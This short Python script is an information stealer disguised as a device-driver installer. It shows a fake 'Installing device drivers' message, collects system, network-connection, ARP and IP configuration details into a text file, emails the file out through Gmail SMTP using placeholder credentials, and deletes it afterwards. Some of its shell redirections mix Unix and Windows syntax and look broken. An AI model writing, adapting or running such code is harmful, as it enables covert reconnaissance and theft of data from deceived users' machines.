import os
import smtplib
import requests

print("Installing device drivers please wait... ")

url = "https://www.google.com"
try:
    url = requests.get(url)

    if url.status_code != 200:
        exit()
except Exception:
    exit()

file = "USB.txt"

def cmd(str):
    os.system(str)

def mailer(file):
    with open(file , "r") as f:
        read = f.read()

    server = smtplib.SMTP("smtp.gmail.com" , 587)
    server.ehlo()
    server.starttls()
    server.login("__mail" , "__password" )
    server.sendmail("__mail" , "__mail" , read)

cmd("systeminfo > /dev/null >> USB.txt")
cmd("netstat -n > /dev/null >> USB.txt")
cmd("netstat -a > /dev/null >> USB.txt")
cmd("netstat -r > /dev/null >> USB.txt")
cmd("netstat -s > /dev/null >> USB.txt")
cmd("arp -a > /dev/null >> USB.txt")
cmd("ipconfig > /dev/null >> USB.txt")

mailer(file)

os.remove("USB.txt")

